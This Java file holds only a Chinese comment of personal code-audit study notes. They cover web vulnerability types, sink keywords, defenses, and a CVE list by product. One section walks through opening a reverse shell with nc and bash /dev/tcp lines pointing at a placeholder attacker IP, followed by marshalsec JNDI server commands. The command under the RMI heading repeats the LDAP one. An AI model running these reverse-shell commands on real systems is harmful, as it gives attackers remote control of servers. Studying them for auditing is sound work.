package summary.security;

public class Summary1 {
    /**
     * 如果不是用户交互的话 审计的时候就可以过滤掉
     *
     * csrf: 假冒用户身份去做一些不合理操作 防护：token、再次验证密码、referer
     *
     * xss：获取cookie 后台没有对用户输入进行过滤或者检查 直接把用户输入返回到前端 导致恶意代码在前端任意执行
     * 防护：设置HTTPOnly、对用户输入进行验证、对不可信数据进行恰当的输出编码
     * 关键字：getParamter、<%=、param.
     *
     * sql注入:PrepareStatement，$,禁止拼接 ,
     * json注入：用户自定义构造恶意代码的json 服务器端没有对输入做过滤处理 解决：使用安全的序列化函数代替
     * http响应截断：request的参数里没有限制 可能会传入\r\n截断响应 使用白名单验证请求参数（只能由字母和数字构成）
     * ssrf: 服务器端访问另一个URL没有过滤
     * rce（命令执行、代码执行）：代码执行 输入过滤 输出编码
     * 重定向：重定向的url没有验证  建议创建一份合理的URL列表
     * 命令注入：关键字Runtime.exec() 、proccessBuilder.start()
     * DDOS：发送大量请求，消耗服务器资源，导致服务器奔溃（例如 用户向服务器发送超大文件） 防护：严格校验输入
     * 动态代码执行（代码注入）：请求的参数是动态的没有进行过滤校验 可能存在代码注入的风险， 防护：服务器端绝对不能直接解析和执行未经验证的用户输入的数据
     * 反射文件下载：允许攻击者创建钓鱼URL或者页面的漏洞 访问该URL或者页面的时候 就会下载来自不可信任域任意内容的文件
     * 二次注入：
     * 日志敏感记录：关键字log.info logger.info
     *
     * 反序列化总结
     * 关键字：ObjectInputStream.readObject、ObjectInputStream.readUnshared、XMLDecoder.readObject、Yaml.load 、 XStream.fromXML 、 ObjectMapper.readValue 、
     * xml反序列化：xml文档被用户控制，攻击者就有机会在服务器上执行任意的恶意代码
     * yml反序列化：防护：safeConstruct()->转tag标签 类似白名单过滤
     * shiro反序列化：key硬编码 爆破key之后伪造cookie 服务器端获取cookie之后反序列化过程就执行了恶意代码
     * fastjson反序列化：@Type字段反序列化时没有做安全校验 关键字：JSON.parseObject，JSON.toJsonString
     * Apache commons colletions 这个库利用在了很多组件上 例如 WebSphere、WebLogic、Jenkins 涉及问题点的两个类：ObjectInputStream、InvokerTransformer
     *
     * xml注入(读取xml时候 出现类似代码：<!Doctype foo System "file:/x/x">)：SAX 或者 DOM解析的时候就会访问这些URI 就能读取到恶意代码
     * 解决方式：实现SAX的EntityResolve接口 类似白名单过滤
     * XXE 常见关键字： http、https file ftp mailto jar netdoc
     * xml注入关键字：SAXBuilder、SAXParser、XMLReader、DocumentBuilder
     *
     *
     * 文件操作
     * 目录遍历（路径遍历）：禁止外界指定文件，文件名不能包含目录，限定文件名只有字母和数字 ，创建一份合法的资源名列表（输入..或 / 都可以直接访问服务器目录）
     * 任意文件上传：上传巨大文件会导致DOS（限制文件大小），上传可执行脚本文件（注意文件名后缀限制） 关键字：Upload、write、fileName 、filePath
     * 危险文件包含：代码中包含未经验证的用户输入的能被控制的文件 会导致恶意代码执行
     * 任意文件下载：关键字：download 、fileName 、filePath、write、getFile、getWriter
     *
     *
     *  java命令执行：Runtime 和 ProcessBuilder
     *  Runtime的exec方法底层使用了ProcessBuilder类
     *  processBuilder.start();和runtime.exec()都是执行命令的操作
     *
     * ======================================================
     * 应用场景：
     * OA系统、CMS系统、热门框架、中间件
     * 泛微、用友、网康、蓝凌、通达、锐捷
     * 泛微
     * 泛微云桥 任意文件读取
     * 泛微OA V8 前台Sql注入
     * 泛微OA WorkflowServiceXml RCE CNVD-2019-32204
     * 泛微OA weaver.common.Ctrl 任意文件上传
     * 泛微OA Bsh RCE
     * 泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库) CNVD-2019-34241
     * 泛微OA E-Cology 数据库配置信息泄漏
     *
     * ==================================================
     * 组件漏洞
     * redis
     *  指令安全、端口安全、Lua脚本安全、SSL代理
     * Redis RCE复现及简单分析（CVE-2022-0543）
     *
     * es
     * Elasticsearch-Kibana （CVE-2018-17246）
     *
     * dubbo
     * Apache Dubbo Provider默认反序列漏洞（CVE-2020-1948）
     *
     * sharding
     * ShardingSphere RCE (CVE-2020-1947)
     *
     *
     * jboss
     * 代码执行 (CVE-2017-12149)
     * JBossMQJMS 反序列化漏洞（CVE-2017-7504）
     * JBoss JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）
     *
     *
     * ssrf
     * CVE-2021-40438（有点难）
     * CVE-2014-4210
     *
     *
     *
     * docker
     *  docker逃逸 Docker版本 < 18.09.2，runC版本< 1.0-rc6。 (CVE-2019-5736)
     *
     *
     * springcloud
     * Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）
     *
     * struts
     * Struts2 S2-045远程代码执行漏洞（CVE-2017-5638）
     * Struts2 S2-059 远程代码执行 (CVE-2019-0230)
     * Struts2 S2-061远程代码执行漏洞（CVE-2020-17530）
     *
     * Hadoop
     * Spring-data-commons(CVE-2018-1273)
     *
     * spark
     * Apache Spark远程命令执行漏洞
     *
     * sqlserver
     * SQL Server 远程代码执行(CVE-2020-0618)
     *
     * tomcat
     * Tomcat任意文件写入漏洞 (CVE-2017-12615)
     * Tomcat Session 反序列化 (CVE-2020-9484)
     * Apache Tomcat文件包含 (CVE-2020-1938)
     *
     * django
     * Django SQL注入漏洞(CVE-2020-7471)
     *
     * freemarker
     * FreeMarker模板FusionAuth RCE (CVE-2020-7799)
     *
     * nginx
     * Nginx 拒绝服务漏洞(CVE-2019-9513、CVE-2019-9511)
     *
     * solr
     * Apache Solr远程代码执行漏洞（CVE-2019-12409)
     *Tomcat AJP本地文件包含漏洞（CNVD-2020-10487）
     * Tomcat WebSocket拒绝服务漏洞（CVE-2020-13935）
     * Apache Solr JMX服务 RCE 漏洞
     *
     * weblogic
     * WebLogic后台命令执行漏洞（）
     * Weblogic前台验证绕过+后台命令执行漏洞（CVE-2020-14882、CVE-2020-14883）
     * Weblogic前台验证绕过漏洞（CVE-2020-14750）
     * WebLogic任意文件上传漏洞(CVE-2019-2618)
     * Weblogic反序列化漏洞 (CVE-2020-14825)
     * Weblogic远程代码执行（CVE-2020-14645） 复现失败了
     * Weblogic SSRF漏洞 (CVE-2014-4210)
     *
     *
     * shiro
     * Apache Shiro权限绕过 (CVE-2020-11989)
     *
     * openssh
     * OpenSSH命令注入漏洞 (CVE-2020-15778)
     *
     *
     *  邮件安全
     *  CVE-2022-20798
     *  邮件病毒、邮件炸弹、密码问题、钓鱼邮件
     *  命令注入：POP3和SMTP 两个都是使用时候对用户输入的参数没有过滤 建议白名单过滤
     *
     * ===========================================================================
     *
     * 其他：
     *  硬编码 弱密码 明文 避免弱加密 避免空密码  控制密钥key的长度
     *  避免使用不安全的工具类（Random、SimpleDateFormat（线程不安全 建议使用线程同步机制或者使用ThreadLocal））
     *
     *  未授权访问:配置不当未经授权就可以访问，无需认证就可以访问内部数据
     *  mongo、redis、memcached、JBOSS、docker、es、hadoop
     *  =============================================================================================
     *
     *  常见漏洞点
     *  文件上传处、文章编辑、资料编辑、头像上传、附件上传、任意出现任意文件上传和SQL注入
     *  文件管理（如果程序是能将文件名或者文件路径直接在参数中传递 ）就可能出现任意文件操作、任意文件读取，还可能出现XSS 向页面里输入<等特殊符号 然后被执行
     *  登陆认证，cookie的安全性，
     *  找回密码，可能会出现重置管理员密码的问题
     *
     *
     * 代码审计常见思路：
     * 1：根据敏感关键字回溯参数传递过程（重点关注这些关键字函数使用是否得当）
     * 2 查找可控变量 正向追踪变量传递过程
     * 3 寻找敏感功能点 通读功能点代码
     * 4 直接通读全文代码
     *
     * ==============================================================
     * 反弹shell
     * 为什么要反弹shell
     * 反弹shell前提是已经进入对方服务器 ，但是直接在对方服务器上操作命令就不安全
     * 所以通过对方服务器上连接攻击者本地开启的服务器
     * 然后就两者之间发请求 并把输入重定向到攻击者端
     *
     * 除了nc 还有bash -i等
     *
     * 怎么反弹
     * 攻击者打开端口等待连接：nc -lvp 4444
     * 被攻击者运行反弹命令（被攻击者怎么运行 其实就是在该服务器网站上找个输入的入口 写入命令就好了）：bash -i >& /dev/tcp/攻击者IP/4444 0>&1
     * （nc反弹：nc -e /bin/bash 攻击者IP 4444）还可以telnet反弹
     * 然后被攻击者就与攻击者连上了
     * 攻击者就可以给对方服务器发请求了
     *
     * 开启LDAP服务
     * 1389 指LDAP服务的端口
     * java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/#ExportObject 1389
     *
     * 开启RMI服务
     * 1099 指RMI服务的端口
     * java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/#ExportObject 1389
     *
     *
     * CRLF是回车+换行（\r\n）的简称 十六进制编码分别为0x0d和0x0a
     * Http header与http body是用两个CRLF分割的 浏览器就是根据这两个CRLF来取出HTTP内容并显示出来
     *
     *
     * 什么是nc nc的作用
     * nc可以端口扫描、文件传输、开启端口、端口转发、远程控制
     *
     * docker使用
     * docker search Java
     * docker pull 镜像名字
     * docker run -it --name jdk1.8 -d primetoninc/jdk:1.8
     * （前面的jdk1.8是别名 后面的primetoninc/jdk:1.8是镜像名）
     * 如果docker pull很慢的话 就给docker重启一下
     *
     *
     * weblogic 反序列化分两种
     * 一种是基于T3协议 CVE-2020-14645 CVE-2020-14825
     * 一种是基于XML的反序列化
     * T3协议：
     * RMI 通信时会将数据进行序列化后传输，同样的接收数据后反序列化进行接收，正常RMI通信使用的是JRMP协议，而在Weblogic的RMI通信中使用的是T3协议，T3是weblogic独有的一个协议，相比于JRMP多了如下协议：
     * 服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。
     * 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。
     *
     */
}
